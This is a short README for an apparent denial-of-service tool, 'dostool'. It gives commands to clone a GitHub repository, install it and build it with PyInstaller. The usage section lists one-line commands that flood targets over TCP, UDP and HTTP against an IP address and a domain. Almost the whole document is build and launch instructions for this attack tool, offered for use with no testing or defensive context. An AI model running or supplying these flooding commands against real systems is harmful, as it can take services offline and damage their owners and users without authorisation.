# Installation

## 1. Create VEnv
``` bash
python3 -m venv .venv
source ./.venv/bin/activate
```

## 2. Install
``` bash
git clone https://github.com/i4ego/dostool.git 
cd dostool
python3 -m pip install -r req.txt
```

## 3. Build
``` bash
python3 -m pip install pyinstaller
pyinstaller --onefile --console --clean --noconfirm \
 --distpath ./ --name dostool dostool.py
rm dostool.spec
rm -rf build
```

# Usage

## DoS by TCP 
``` dostool tcp 192.168.0.1:53 ```

## DoS by UDP
``` dostool udp 192.168.0.1:53 ```

## DoS domains
``` dostool tcp example.com:80 ```

## DoS domains (not raw data)
``` dostool http example.com:80 ```